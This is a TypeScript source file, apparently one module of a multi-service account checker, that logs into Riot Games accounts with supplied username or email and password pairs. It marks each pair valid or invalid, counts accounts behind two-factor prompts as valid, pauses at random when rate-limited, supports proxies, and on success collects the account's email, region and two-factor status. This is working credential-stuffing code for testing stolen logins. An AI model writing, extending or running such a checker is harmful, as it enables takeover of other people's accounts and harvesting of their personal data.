import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class RiotChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('riot', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      this.isEmail(credential) ? this.checkAsUsername.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Step 1: Get CSRF token and cookies
      const authResponse = await this.client.post(
        'https://auth.riotgames.com/api/v1/authorization',
        {
          client_id: 'play-valorant-web-prod',
          nonce: '1',
          redirect_uri: 'https://playvalorant.com/opt_in',
          response_type: 'token id_token',
          scope: 'account openid',
        }
      );

      // Step 2: Login attempt
      const loginResponse = await this.client.put(
        'https://auth.riotgames.com/api/v1/authorization',
        {
          type: 'auth',
          username: credential,
          password: password,
          remember: true,
        }
      );

      if (loginResponse.data?.type === 'response') {
        const capture = await this.getAccountDetails(loginResponse.data);
        return this.createResult(credential, password, 'riot', 'valid', capture);
      }

      if (loginResponse.data?.type === 'multifactor') {
        return this.createResult(credential, password, 'riot', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.createResult(credential, password, 'riot', 'invalid');
    } catch (error: any) {
      if (error.response?.status === 429) {
        await this.sleep(this.getRandomDelay(3000, 8000));
      }
      
      return this.handleError(error, credential, password);
    }
  }

  private async checkAsUsername(credential: string, password: string): Promise<CheckResult> {
    // If credential is email, we already tried it as username in primary check
    return this.createResult(credential, password, 'riot', 'invalid');
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    // If credential is username, we already tried it as email in primary check
    return this.createResult(credential, password, 'riot', 'invalid');
  }

  private async getAccountDetails(authData: any) {
    try {
      const response = await this.client.get(
        'https://account.riotgames.com/api/account/v1/user',
        {
          headers: {
            Authorization: `Bearer ${authData.access_token}`,
          },
        }
      );

      return {
        username: response.data?.username,
        email: response.data?.email,
        emailVerified: response.data?.email_verified,
        region: response.data?.region,
        createdDate: response.data?.created_at,
        twoFactorEnabled: response.data?.multifactor?.enabled,
      };
    } catch {
      return {};
    }
  }
}
